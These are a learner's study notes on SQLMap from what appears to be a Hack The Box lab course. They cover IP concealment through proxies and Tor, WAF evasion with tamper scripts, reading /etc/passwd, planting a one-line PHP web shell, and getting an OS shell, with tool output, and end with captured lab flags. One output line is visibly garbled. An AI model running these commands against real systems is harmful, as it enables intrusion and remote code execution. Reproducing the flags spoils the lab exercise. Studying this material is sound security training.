    KareemAlsadeq@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URIURI: http://www.example.com:80/?id=1&h=c4ca4238a0b923820dcc509a6f75849b
    URI: http://www.example.com:80/?id=1&h=c4ca4238a0b923820dcc509a6f75849b
    URI: http://www.example.com:80/?id=9061&h=4d7e0d72898ae7ea3593eb5ebf20c744
    URI: http://www.example.com:80/?id=1%2C.%2C%27%22.%2C%28.%29&h=620460a56536e2d32fb2f4842ad5a08d
    URI: http://www.example.com:80/?id=1%27MyipGP%3C%27%22%3EibjjSu&h=db7c815825b14d67aaa32da09b8b2d42
    URI: http://www.example.com:80/?id=1%29%20AND%209978%socks4://177.39.187.70:33283ssocks4://177.39.187.70:332833D1232%20AND%20%284955%3D4955&h=02312acd4ebe69e2528382dfff7fc5cc
    ```
    
      
    
- IP Address Concealing
    
    ### definition:
    
    how to hide and coneal our IP address so the other hackers cannot find our location .
    
    ### command:
    
    `--proxy` we put after it the proxy we want to use (”socks4://the ip :theport”)
    
    `--tor` this will make sqlmap automatically search for the local port that sweats the ip we say and we can get the ip from ( socks4) which is a big tor list of ips .
    
      
    
    ### main
    
    ## IP Address Concealing
    
    In case we want to conceal our IP address, or if a certain web  
    application has a protection mechanism that blacklists our current IP  
    address, we can try to use a proxy or the anonymity network Tor. A proxy  
    can be set with the option `--proxy` (e.g. `--proxy="socks4://177.39.187.70:33283"`), where we should add a working proxy.
    
    In addition to that, if we have a list of proxies, we can provide them to SQLMap with the option `--proxy-file`.  
    This way, SQLMap will go sequentially through the list, and in case of  
    any problems (e.g., blacklisting of IP address), it will just skip from  
    current to the next from the list. The other option is Tor network use  
    to provide an easy to use anonymization, where our IP can appear  
    anywhere from a large list of Tor exit nodes. When properly installed on  
    the local machine, there should be a `SOCKS4` proxy service at the local port 9050 or 9150. By using switch `--tor`, SQLMap will automatically try to find the local port and use it appropriately.
    
    If we wanted to be sure that Tor is properly being used, to prevent unwanted behavior, we could use the switch `--check-tor`. In such cases, SQLMap will connect to the `https://check.torproject.org/` and check the response for the intended result (i.e., `Congratulations` appears inside).
    
      
    
- WAF bypass
    
    ### definition:
    
    it is just a skipping method to not check the waf .
    
    i dont think that there is a waf bypassing way that they said at all what they are saying is just ( how to skip the checking of waf ) and this is done via the command → `--skip-waf`
    
- User-agent blacklisting Bypass
    
    ### definition:
    
    sometimes the sqlmap as a user agent is blocked so we then we can use a random agent as user by saying the command `--random-agent` whcih changes the default user-agent with a randomly chosen value from a large pool of values used by browsers.
    
      
    
- Tamper Scripts
    
    ### definition:
    
    - tamper scripts are python scripts that are normally written to bypass a certain protection type they are made to bypass it by → modifying HTTP requests.
    
    ### examples:
    
    - the situation : → the target WAF detects (<,=,>) so we use the tamper scripts to bypass it by converting all the > into ( NOT BETWEEN 0 AND #) and the = into ( BETWEEN # AND #) and so on
    - this happens atleast for sqli purposes.
    
    - tamper scripts and how to get them :
        
        |   |   |
        |---|---|
        |**Tamper-Script**|**Description**|
        |`0eunion`|Replaces instances of UNION with e0UNION|
        |`base64encode`|Base64-encodes all characters in a given payload|
        |`between`|Replaces greater than operator (`>`) with `NOT BETWEEN 0 AND #` and equals operator (`=`) with `BETWEEN # AND #`|
        |`commalesslimit`|Replaces (MySQL) instances like `LIMIT M, N` with `LIMIT N OFFSET M` counterpart|
        |`equaltolike`|Replaces all occurrences of operator equal (`=`) with `LIKE` counterpart|
        |`halfversionedmorekeywords`|Adds (MySQL) versioned comment before each keyword|
        |`modsecurityversioned`|Embraces complete query with (MySQL) versioned comment|
        |`modsecurityzeroversioned`|Embraces complete query with (MySQL) zero-versioned comment|
        |`percentage`|Adds a percentage sign (`%`) in front of each character (e.g. SELECT -> %S%E%L%E%C%T)|
        |`plus2concat`|Replaces plus operator (`+`) with (MsSQL) function CONCAT() counterpart|
        |`randomcase`|Replaces each keyword character with random case value (e.g. SELECT -> SEleCt)|
        |`space2comment`|Replaces space character ( ) with comments `/|
        |`space2dash`|Replaces space character ( ) with a dash comment (`--`) followed by a random string and a new line (`\n`)|
        |`space2hash`|Replaces (MySQL) instances of space character ( ) with a pound character (`#`) followed by a random string and a new line (`\n`)|
        |`space2mssqlblank`|Replaces (MsSQL) instances of space character ( ) with a random blank character from a valid set of alternate characters|
        |`space2plus`|Replaces space character ( ) with plus (`+`)|
        |`space2randomblank`|Replaces space character ( ) with a random blank character from a valid set of alternate characters|
        |`symboliclogical`|Replaces AND and OR logical operators with their symbolic counterparts (`&&` and `\|`)|
        |`versionedkeywords`|Encloses each non-function keyword with (MySQL) versioned comment|
        |`versionedmorekeywords`|Encloses each keyword with (MySQL) versioned comment|
        
        To get a whole list of implemented tamper scripts, along with the description as above, switch `--list-tampers` can be used. We can also develop custom Tamper scripts for any custom type of attack, like a second-order SQLi.
        
    - the output
        
        [~]  
        joyhunter  sqlmap --list-tamper  
        ___  
        **H**  
        ___ _**[,]**___ ___ ___ {1.7.8\#stable}  
        |_ -| . [,] | .'| . |  
        |_|_ _[,]__|_|_|__,|_ _|  
        |__|V... |_| [https://sqlmap.org](https://sqlmap.org/)
        
        [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
        
        [*] starting @ 01:40:13 /2023-09-25/
        
        [01:40:13] [INFO] listing available tamper scripts
        
        - [0eunion.py](http://0eunion.py/) - Replaces instances of <int> UNION with <int>e0UNION
        - [apostrophemask.py](http://apostrophemask.py/) - Replaces apostrophe character (') with its UTF-8 full width counterpart (e.g. ' -> %EF%BC%87)
        - [apostrophenullencode.py](http://apostrophenullencode.py/) - Replaces apostrophe character (') with its illegal double unicode counterpart (e.g. ' -> %00%27)
        - [appendnullbyte.py](http://appendnullbyte.py/) - Appends (Access) NULL byte character (%00) at the end of payload
        - [base64encode.py](http://base64encode.py/) - Base64-encodes all characters in a given payload
        - [between.py](http://between.py/) - Replaces greater than operator ('>') with 'NOT BETWEEN 0 AND #' and equals operator ('=') with 'BETWEEN # AND #'
        - [binary.py](http://binary.py/) - Injects keyword binary where possible
        - [bluecoat.py](http://bluecoat.py/) - Replaces space character after SQL statement with a valid random blank character. Afterwards replace character '=' with operator LIKE
        - [chardoubleencode.py](http://chardoubleencode.py/) - Double URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %2553%2545%254C%2545%2543%2554)
        - [charencode.py](http://charencode.py/) - URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %53%45%4C%45%43%54)
        - [charunicodeencode.py](http://charunicodeencode.py/) - Unicode-URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %u0053%u0045%u004C%u0045%u0043%u0054)
        - [charunicodeescape.py](http://charunicodeescape.py/) - Unicode-escapes non-encoded characters in a given payload (not processing already encoded) (e.g. SELECT -> \u0053\u0045\u004C\u0045\u0043\u0054)
        - [commalesslimit.py](http://commalesslimit.py/) - Replaces (MySQL) instances like 'LIMIT M, N' with 'LIMIT N OFFSET M' counterpart
        - [commalessmid.py](http://commalessmid.py/) - Replaces (MySQL) instances like 'MID(A, B, C)' with 'MID(A FROM B FOR C)' counterpart
        - [commentbeforeparentheses.py](http://commentbeforeparentheses.py/) - Prepends (inline) comment before parentheses (e.g. ( -> /**/()
        - [concat2concatws.py](http://concat2concatws.py/) - Replaces (MySQL) instances like 'CONCAT(A, B)' with 'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)' counterpart
        - [decentities.py](http://decentities.py/) - HTML encode in decimal (using code points) all characters (e.g. ' -> ')
        - [dunion.py](http://dunion.py/) - Replaces instances of <int> UNION with <int>DUNION
        - [equaltolike.py](http://equaltolike.py/) - Replaces all occurrences of operator equal ('=') with 'LIKE' counterpart
        - [equaltorlike.py](http://equaltorlike.py/) - Replaces all occurrences of operator equal ('=') with 'RLIKE' counterpart
        - [escapequotes.py](http://escapequotes.py/) - Slash escape single and double quotes (e.g. ' -> \')
        - [greatest.py](http://greatest.py/) - Replaces greater than operator ('>') with 'GREATEST' counterpart
        - [halfversionedmorekeywords.py](http://halfversionedmorekeywords.py/) - Adds (MySQL) versioned comment before each keyword
        - [hex2char.py](http://hex2char.py/) - Replaces each (MySQL) 0x<hex> encoded string with equivalent CONCAT(CHAR(),...) counterpart
        - [hexentities.py](http://hexentities.py/) - HTML encode in hexadecimal (using code points) all characters (e.g. ' -> 1)
        - [htmlencode.py](http://htmlencode.py/) - HTML encode (using code points) all non-alphanumeric characters (e.g. ' -> ')
        - [if2case.py](http://if2case.py/) - Replaces instances like 'IF(A, B, C)' with 'CASE WHEN (A) THEN (B) ELSE (C) END' counterpart
        - [ifnull2casewhenisnull.py](http://ifnull2casewhenisnull.py/) - Replaces instances like 'IFNULL(A, B)' with 'CASE WHEN ISNULL(A) THEN (B) ELSE (A) END' counterpart
        - [ifnull2ifisnull.py](http://ifnull2ifisnull.py/) - Replaces instances like 'IFNULL(A, B)' with 'IF(ISNULL(A), B, A)' counterpart
        - [informationschemacomment.py](http://informationschemacomment.py/) - Add an inline comment (/**/) to the end of all occurrences of (MySQL) "information_schema" identifier
        - [least.py](http://least.py/) - Replaces greater than operator ('>') with 'LEAST' counterpart
        - [lowercase.py](http://lowercase.py/) - Replaces each keyword character with lower case value (e.g. SELECT -> select)
        - [luanginx.py](http://luanginx.py/) - LUA-Nginx WAFs Bypass (e.g. Cloudflare)
        - [misunion.py](http://misunion.py/) - Replaces instances of UNION with -.1UNION
        - [modsecurityversioned.py](http://modsecurityversioned.py/) - Embraces complete query with (MySQL) versioned comment
        - [modsecurityzeroversioned.py](http://modsecurityzeroversioned.py/) - Embraces complete query with (MySQL) zero-versioned comment
        - [multiplespaces.py](http://multiplespaces.py/) - Adds multiple spaces (' ') around SQL keywords
        - [ord2ascii.py](http://ord2ascii.py/) - Replaces ORD() occurences with equivalent ASCII() calls
        - [overlongutf8.py](http://overlongutf8.py/) - Converts all (non-alphanum) characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. ' -> %C0%A7)
        - [overlongutf8more.py](http://overlongutf8more.py/) - Converts all characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. SELECT -> %C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94)
        - [percentage.py](http://percentage.py/) - Adds a percentage sign ('%') infront of each character (e.g. SELECT -> %S%E%L%E%C%T)
        - [plus2concat.py](http://plus2concat.py/) - Replaces plus operator ('+') with (MsSQL) function CONCAT() counterpart
        - [plus2fnconcat.py](http://plus2fnconcat.py/) - Replaces plus operator ('+') with (MsSQL) ODBC function {fn CONCAT()} counterpart
        - [randomcase.py](http://randomcase.py/) - Replaces each keyword character with random case value (e.g. SELECT -> SEleCt)
        - [randomcomments.py](http://randomcomments.py/) - Add random inline comments inside SQL keywords (e.g. SELECT -> S/**/E/**/LECT)
        - [schemasplit.py](http://schemasplit.py/) - Splits FROM schema identifiers (e.g. 'testdb.users') with whitespace (e.g. 'testdb 9.e.users')
        - [scientific.py](http://scientific.py/) - Abuses MySQL scientific notation
        - [sleep2getlock.py](http://sleep2getlock.py/) - Replaces instances like 'SLEEP(5)' with (e.g.) "GET_LOCK('ETgP',5)"
        - sp_password.py - Appends (MsSQL) function 'sp_password' to the end of the payload for automatic obfuscation from DBMS logs
        - [space2comment.py](http://space2comment.py/) - Replaces space character (' ') with comments '/**/'
        - [space2dash.py](http://space2dash.py/) - Replaces space character (' ') with a dash comment ('--') followed by a random string and a new line ('\n')
        - [space2hash.py](http://space2hash.py/) - Replaces (MySQL) instances of space character (' ') with a pound character ('#') followed by a random string and a new line ('\n')
        - [space2morecomment.py](http://space2morecomment.py/) - Replaces (MySQL) instances of space character (' ') with comments '/**_**/'
        - [space2morehash.py](http://space2morehash.py/) - Replaces (MySQL) instances of space character (' ') with a pound character ('#') followed by a random string and a new line ('\n')
        - [space2mssqlblank.py](http://space2mssqlblank.py/) - Replaces (MsSQL) instances of space character (' ') with a random blank character from a valid set of alternate characters
        - [space2mssqlhash.py](http://space2mssqlhash.py/) - Replaces space character (' ') with a pound character ('#') followed by a new line ('\n')
        - [space2mysqlblank.py](http://space2mysqlblank.py/) - Replaces (MySQL) instances of space character (' ') with a random blank character from a valid set of alternate characters
        - [space2mysqldash.py](http://space2mysqldash.py/) - Replaces space character (' ') with a dash comment ('--') followed by a new line ('\n')
        - [space2plus.py](http://space2plus.py/) - Replaces space character (' ') with plus ('+')
        - [space2randomblank.py](http://space2randomblank.py/) - Replaces space character (' ') with a random blank character from a valid set of alternate characters
        - [substring2leftright.py](http://substring2leftright.py/) - Replaces PostgreSQL SUBSTRING with LEFT and RIGHT
        - [symboliclogical.py](http://symboliclogical.py/) - Replaces AND and OR logical operators with their symbolic counterparts (&& and ||)
        - [unionalltounion.py](http://unionalltounion.py/) - Replaces instances of UNION ALL SELECT with UNION SELECT counterpart
        - [unmagicquotes.py](http://unmagicquotes.py/) - Replaces quote character (') with a multi-byte combo %BF%27 together with generic comment at the end (to make it work)
        - [uppercase.py](http://uppercase.py/) - Replaces each keyword character with upper case value (e.g. select -> SELECT)
        - [varnish.py](http://varnish.py/) - Appends a HTTP header 'X-originating-IP' to bypass Varnish Firewall
        - [versionedkeywords.py](http://versionedkeywords.py/) - Encloses each non-function keyword with (MySQL) versioned comment
        - [versionedmorekeywords.py](http://versionedmorekeywords.py/) - Encloses each keyword with (MySQL) versioned comment
        - [xforwardedfor.py](http://xforwardedfor.py/) - Append a fake HTTP header 'X-Forwarded-For' (and alike)
        
        [*] ending @ 01:40:13 /2023-09-25/
        
        [~]  
        joyhunter 
        
- Miscellaneous Bypasses
    
    ### definition:
    
    other protection’s bypassing mechanisms that we should mention are :
    
    1. Chunked
        
        ```
        --chunked -> this switch is used to do things like ( scrscriptipt) and by this it is called spiliting http requests by adding chunkes ( ZEBALA)  so that we can bass the blacklisted  sql keywords .
        ```
        
    2. HPP :
        1. http parameter pollution → where payloads are split in a similar wya as incase of - -chunked switch doing .
            1. example :
                1. (e.g. `?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users...`),
                

## OS Exploitation

### definition:

- how to exploit =utilize= use the OS (operating system ) during the sqli to do things like :
    1. read files
    2. write files
    3. give us direct command excution on the remote host . ( if we have proper privileges to do so)

### key points :

- File Read/write
    
    `LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE passwd;` we are saying load the data in local system presents infile ‘…..passwd’ that presents into table passwd
    
- Checking for DBA privileges
    
    - database administrator privileges (DBA)
    - To check whether we have DBA privileges with SQLMap, we can use the `--is-dba` option:
    
    ```
    KareemAlsadeq@htb[/htb]$ sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba        ___
           __H__
     ___ ___[)]_____ ___ ___  {1.4.11\#stable}|_ -| . [)]     | .'| . |
    |___|_  ["]_|_|_|__,|  _|
          |_|V...       |_|   http://sqlmap.org
    
    [*] starting @ 17:31:55 /2020-11-19/
    
    [17:31:55] [INFO] resuming back-end DBMS 'mysql'
    [17:31:55] [INFO] testing connection to the target URL
    sqlmap resumed the following injection point(s) from stored session:
    ...SNIP...
    current user is DBA: False
    
    [*] ending @ 17:31:56 /2020-11-19
    ```
    
- Reading files from the local system
    
    Instead of manually injecting the above line through SQLi, SQLMap makes it relatively easy to read local files with the `--file-read` option:
    
    ```
    KareemAlsadeq@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"        ___
           __H__
     ___ ___[)]_____ ___ ___  {1.4.11\#stable}|_ -| . [)]     | .'| . |
    |___|_  [)]_|_|_|__,|  _|
          |_|V...       |_|   http://sqlmap.org
    
    
    [*] starting @ 17:40:00 /2020-11-19/
    
    [17:40:00] [INFO] resuming back-end DBMS 'mysql'
    [17:40:00] [INFO] testing connection to the target URL
    sqlmap resumed the following injection point(s) from stored session:
    ...SNIP...
    [17:40:01] [INFO] fetching file: '/etc/passwd'
    [17:40:01] [WARNING] time-based comparison requires larger statistical model, please wait............................. (done)
    [17:40:07] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
    [17:40:07] [WARNING] unable to retrieve the content of the file '/etc/passwd', going to fall-back to simpler UNION technique
    [17:40:07] [INFO] fetching file: '/etc/passwd'
    do you want confirmation that the remote file '/etc/passwd' has been successfully downloaded from the back-end DBMS file system? [Y/n] y
    
    [17:40:14] [INFO] the local file '~/.sqlmap/output/www.example.com/files/_etc_passwd' and the remote file '/etc/passwd' have the same size (982 B)
    files saved to [1]:
    [*] ~/.sqlmap/output/www.example.com/files/_etc_passwd (same file)
    
    [*] ending @ 17:40:14 /2020-11-19/
    ```
    
    As we can see, SQLMap said `files saved` to a local file. We can `cat` the local file to see its content:
    
    ```
    KareemAlsadeq@htb[/htb]$ cat ~/.sqlmap/output/www.example.com/files/_etc_passwdroot:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    ...SNIP...
    ```
    
    We have successfully retrieved the remote file.
    
- Writing files into the local system
    
    Still, many web applications require the ability for DBMSes to write  
    data into files, so it is worth testing whether we can write files to  
    the remote server. To do that with SQLMap, we can use the `--file-write` and `--file-dest` options. First, let's prepare a basic PHP web shell and write it into a `shell.php` file:
    
    ```
    KareemAlsadeq@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
    ```
    
    Now, let's attempt to write this file on the remote server, in the `/var/www/html/`  
    directory, the default server webroot for Apache. If we didn't know the  
    server webroot, we will see how SQLMap can automatically find it.
    
    ```
    KareemAlsadeq@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"        ___
           __H__
     ___ ___[']_____ ___ ___  {1.4.11\#stable}|_ -| . [(]     | .'| . |
    |___|_  [,]_|_|_|__,|  _|
          |_|V...       |_|   http://sqlmap.org
    
    
    [*] starting @ 17:54:18 /2020-11-19/
    
    [17:54:19] [INFO] resuming back-end DBMS 'mysql'
    [17:54:19] [INFO] testing connection to the target URL
    sqlmap resumed the following injection point(s) from stored session:
    ...SNIP...
    do you want confirmation that the local file 'shell.php' has been successfully written on the back-end DBMS file system ('/var/www/html/shell.php')? [Y/n] y
    
    [17:54:28] [INFO] the local file 'shell.php' and the remote file '/var/www/html/shell.php' have the same size (31 B)
    
    [*] ending @ 17:54:28 /2020-11-19/
    ```
    
    We see that SQLMap confirmed that the file was indeed written:
    
    ```
    [17:54:28] [INFO] the local file 'shell.php' and the remote file '/var/www/html/shell.php' have the same size (31 B)
    ```
    
    Now, we can attempt to access the remote PHP shell, and execute a sample command:
    
    ```
    KareemAlsadeq@htb[/htb]$ curl http://www.example.com/shell.php?cmd=ls+-latotal 148
    drwxrwxrwt 1 www-data www-data   4096 Nov 19 17:54 .
    drwxr-xr-x 1 www-data www-data   4096 Nov 19 08:15 ..
    -rw-rw-rw- 1 mysql    mysql       188 Nov 19 07:39 basic.php
    ...SNIP...
    ```
    
    We see that our PHP shell was indeed written on the remote server, and that we do have command execution over the host server.
    
- OS command Execution
    
    Now that we confirmed that we could write a PHP shell to get command execution, we can test SQLMap's ability to give us an easy OS shell without manually writing a remote shell. SQLMap utilizes various techniques to get a remote shell through SQL injection vulnerabilities, like writing a remote shell, as we just did, writing SQL functions that execute commands and retrieve output or even using some SQL queries that directly execute OS command, like xp_cmdshell in Microsoft SQL Server. To get an OS shell with SQLMap, we can use the --os-shell option, as follows:
    
    KareemAlsadeq@htb[/htb]$ sqlmap -u "[http://www.example.com/?id=1](http://www.example.com/?id=1)" --os-shell
    
    ```
        ___
       __H__
    ```
    
    ___ _**[.]**___ ___ ___ {1.4.11\#stable}  
    |_ -| . [)] | .'| . |  
    |_|_ _["]__|_|_|__,|_ _|  
    |__|V... |_| [http://sqlmap.org](http://sqlmap.org/)
    
    [*] starting @ 18:02:15 /2020-11-19/
    
    [18:02:16] [INFO] resuming back-end DBMS 'mysql'  
    [18:02:16] [INFO] testing connection to the target URL  
    sqlmap resumed the following injection point(s) from stored session:  
    ...SNIP...  
    [18:02:37] [INFO] the local file '/tmp/sqlmapmswx18kp12261/lib_mysqludf_sys8kj7u1jp.so' and the remote file './libslpjs.so' have the same size (8040 B)  
    [18:02:37] [INFO] creating UDF 'sys_exec' from the binary UDF file  
    [18:02:38] [INFO] creating UDF 'sys_eval' from the binary UDF file  
    [18:02:39] [INFO] going to use injected user-defined functions 'sys_eval' and 'sys_exec' for operating system command execution  
    [18:02:39] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
    
    os-shell> ls -la  
    do you want to retrieve the command standard output? [Y/n/a] a
    
    [18:02:45] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique  
    No output
    
    We see that SQLMap defaulted to UNION technique to get an OS shell, but eventually failed to give us any output No output. So, as we already know we have multiple types of SQL injection vulnerabilities, let's try to specify another technique that has a better chance of giving us direct output, like the Error-based SQL Injection, which we can specify with --technique=E:
    
    KareemAlsadeq@htb[/htb]$ sqlmap -u "[http://www.example.com/?id=1](http://www.example.com/?id=1)" --os-shell --technique=E
    
    ```
        ___
       __H__
    ```
    
    ___ _**[,]**___ ___ ___ {1.4.11\#stable}  
    |_ -| . [,] | .'| . |  
    |_|_ _[(]__|_|_|__,|_ _|  
    |__|V... |_| [http://sqlmap.org](http://sqlmap.org/)
    
    [*] starting @ 18:05:59 /2020-11-19/
    
    [18:05:59] [INFO] resuming back-end DBMS 'mysql'  
    [18:05:59] [INFO] testing connection to the target URL  
    sqlmap resumed the following injection point(s) from stored session:  
    ...SNIP...  
    which web application language does the web server support?  
    [1] ASP  
    [2] ASPX  
    [3] JSP  
    [4] PHP (default)
    
    > 4
    
    do you want sqlmap to further try to provoke the full path disclosure? [Y/n] y
    
    [18:06:07] [WARNING] unable to automatically retrieve the web server document root  
    what do you want to use for writable directory?  
    [1] common location(s) ('/var/www/, /var/www/html, /var/www/htdocs, /usr/local/apache2/htdocs, /usr/local/www/data, /var/apache2/htdocs, /var/www/nginx-default, /srv/www/htdocs') (default)  
    [2] custom location(s)  
    [3] custom directory list file  
    [4] brute force search
    
    > 1
    
    [18:06:09] [WARNING] unable to automatically parse any web server path  
    [18:06:09] [INFO] trying to upload the file stager on '/var/www/' via LIMIT 'LINES TERMINATED BY' method  
    [18:06:09] [WARNING] potential permission problems detected ('Permission denied')  
    [18:06:10] [WARNING] unable to upload the file stager on '/var/www/'  
    [18:06:10] [INFO] trying to upload the file stager on '/var/www/html/' via LIMIT 'LINES TERMINATED BY' method  
    [18:06:11] [INFO] the file stager has been successfully uploaded on '/var/www/html/' - [http://www.example.com/tmpumgzr.php](http://www.example.com/tmpumgzr.php)  
    [18:06:11] [INFO] the backdoor has been successfully uploaded on '/var/www/html/' - [http://www.example.com/tmpbznbe.php](http://www.example.com/tmpbznbe.php)  
    [18:06:11] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER
    
    os-shell> ls -la
    
    do you want to retrieve the command standard output? [Y/n/a] a
    
    ## command standard output:
    
    total 156  
    drwxrwxrwt 1 www-data www-data 4096 Nov 19 18:06 .  
    drwxr-xr-x 1 www-data www-data 4096 Nov 19 08:15 ..  
    -rw-rw-rw- 1 mysql mysql 188 Nov 19 07:39 basic.php  
    ...SNIP...
    
    As we can see, this time SQLMap successfully dropped us into an easy interactive remote shell, giving us easy remote code execution through this SQLi.
    
    Note: SQLMap first asked us for the type of language used on this remote server, which we know is PHP. Then it asked us for the server web root directory, and we asked SQLMap to automatically find it using 'common location(s)'. Both of these options are the default options, and would have been automatically chosen if we added the '--batch' option to SQLMap.
    
    With this, we have covered all of the main functionality of SQLMap.
    

---

  

  

  

### some flags i found :

f1 HTB{c0n6r475_y0u_kn0w_h0w_70_run_b451c_5qlm4p_5c4n}

f2 HTB{700_much_c0n6r475_0n_p057_r3qu357}

f3 HTB{c00k13_m0n573r_15_7h1nk1n6_0f_6r475}

f4 HTB{j450n_v00rh335_53nd5_6r475}

f5 HTB{700_much_r15k_bu7_w0r7h_17}